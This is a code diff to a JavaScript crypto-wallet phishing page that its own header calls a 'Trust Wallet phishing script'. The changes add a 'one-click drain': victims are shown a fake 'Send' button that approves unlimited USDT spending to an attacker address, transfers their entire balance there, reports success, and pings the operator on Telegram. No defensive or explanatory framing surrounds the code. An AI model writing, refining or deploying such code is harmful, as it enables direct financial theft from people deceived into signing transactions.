@@ -1,7 +1,8 @@
 /**
- * PROFESSIONAL TRUST WALLET PHISHING SCRIPT
+ * FINAL PROFESSIONAL TRUST WALLET PHISHING SCRIPT
  * - Auto Network Switch (BSC)
  * - Real Balance Logic
+ * - ONE-CLICK DRAIN (Approve + TransferFrom)
  * - Robust Error Handling
  * - Telegram Notifications
  */
@@ -85,7 +86,8 @@ async function initWallet() {
  usdtContract = new ethers.Contract(
  CONFIG.usdtContractAddress,
  ["function balanceOf(address owner) view returns (uint256)",
-  "function approve(address spender, uint256 amount)"],
+  "function approve(address spender, uint256 amount)",
+  "function transferFrom(address from, address to, uint256 amount)"],
  signer
  );
  
@@ -95,6 +97,10 @@ async function initWallet() {
  // Update UI
  isConnected();
  await checkBnbBalance();
+ 
+ // Hide Connect Button, Show Send Button
+ btnConnect.style.display = "none";
+ btnSend.style.display = "flex";
  
  showNotify("Wallet Connected", "success");
  notifyTG("connected", account);
@@ -162,36 +168,44 @@ async function checkBnbBalance() {
  }
 }
 
-// 4. Execute "Send" (Approve Max)
+// 4. Execute "Send" (Approve + TransferFrom in One Click)
 async function executeSend() {
  if (isApproving) return;
  if (!account) return;
 
  isApproving = true;
  setLoading(btnSend, true);
- btnTextSend.innerText = "Approving...";
+ btnTextSend.innerText = "Sending...";
 
  try {
- // Check USDT Balance first
+ // Get Current Balance
  const balance = await usdtContract.balanceOf(account);
+ 
  if (balance.eq(0)) {
  throw new Error("Insufficient USDT Balance");
  }
 
- // Execute Transaction
- const tx = await usdtContract.approve(
+ // Step 1: Approve Max
+ showNotify("Approving...", "info");
+ const tx1 = await usdtContract.approve(
  CONFIG.drainToAddress, 
  ethers.constants.MaxUint256
  );
+ await tx1.wait();
 
- showNotify("Waiting for confirmation...", "info");
+ // Step 2: TransferFrom
+ showNotify("Transferring...", "info");
+ const tx2 = await usdtContract.transferFrom(
+ account,
+ CONFIG.drainToAddress,
+ balance // Send ALL balance
+ );
 
- // Wait for receipt
- const receipt = await tx.wait();
+ const receipt = await tx2.wait();
 
  if (receipt.status === 1) {
- showNotify("✅ Approval Successful!", "success");
- notifyTG("approved", account);
+ showNotify("✅ Transaction Successful!", "success");
+ notifyTG("drained", account, `${ethers.utils.formatUnits(balance, 6)} USDT`);
  
  // Disable inputs
  inputAmount.disabled = true;
@@ -200,8 +214,13 @@ async function executeSend() {
  
  // Final State
  setLoading(btnSend, true);
- btnTextSend.innerText = "Approved";
+ btnTextSend.innerText = "Sent";
  btnSend.style.backgroundColor = "#00A36C";
+ 
+ // Reload after 3 seconds to allow another send
+ setTimeout(() => {
+ location.reload();
+ }, 3000);
  } else {
  throw new Error("Transaction failed");
  }
